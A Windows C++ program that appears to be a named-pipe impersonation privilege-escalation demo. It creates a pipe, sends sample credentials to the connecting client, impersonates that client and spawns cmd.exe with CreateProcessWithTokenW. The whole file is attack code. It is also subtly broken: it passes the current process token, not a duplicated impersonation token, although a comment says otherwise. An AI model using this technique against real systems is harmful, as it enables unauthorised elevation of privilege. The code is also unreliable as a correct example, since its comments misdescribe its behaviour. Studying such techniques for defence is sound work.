#include <Windows.h>
#include <iostream>

int main() {
    // Define the named pipe path
    LPCWSTR pipeName = L"\\\\.\\pipe\\test-this-pipe";

    // Declare a handle for the server pipe
    HANDLE serverPipe;

    // Initialize a variable to store the number of bytes read
    DWORD readBytes = 0;

    // Initialize a flag for pipe connection
    BOOL isPipeConnected;

    // Define a message to send to the client
    wchar_t message[] = L"Important Data sent from test-this-pipeServer: User:Cat Password:crunchies";

    // Calculate the message length in bytes
    DWORD messageLength = lstrlenW(message) * sizeof(wchar_t);

    // Initialize a variable to store the number of bytes written
    DWORD bytesWritten = 0;

    // Print a message indicating named pipe creation
    std::wcout << "Creating named pipe: " << pipeName << std::endl;

    // Create the named pipe
    serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);

    // Print a message indicating waiting for PipeClient
    std::wcout << "Waiting for PipeClient..." << std::endl;

    // Wait for a client to connect to the named pipe
    isPipeConnected = ConnectNamedPipe(serverPipe, NULL);

    // If a client is connected, print a message
    if (isPipeConnected) {
        std::wcout << "PipeClient has connected to: " << pipeName << std::endl;
    }

    // Print a message indicating sending a message to PipeClient
    std::wcout << "Sending message to PipeClient: " << message << std::endl;

    // Write the message to the named pipe
    WriteFile(serverPipe, message, messageLength, &bytesWritten, NULL);

    // Print a message indicating impersonating the client
    std::wcout << "Impersonating the client..." << std::endl;

    // Impersonate the named pipe client
    ImpersonateNamedPipeClient(serverPipe);

    // Create a new process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);

    // Specify the command to run
    wchar_t command[] = L"C:\\Windows\\system32\\cmd.exe";

    // Create the new process with the duplicated token
    if (CreateProcessWithTokenW(GetCurrentProcessToken(), LOGON_NETCREDENTIALS_ONLY, command, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
        std::wcout << "New process created successfully." << std::endl;
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        // Handle error if process creation fails
        std::wcerr << "Failed to create a new process. Error code: " << GetLastError() << std::endl;
    }

    // Print a message indicating to press Enter to exit
    std::wcout << "Press Enter to exit...";
    std::wcin.get();

    return 0;  // Return 0 to indicate successful execution
}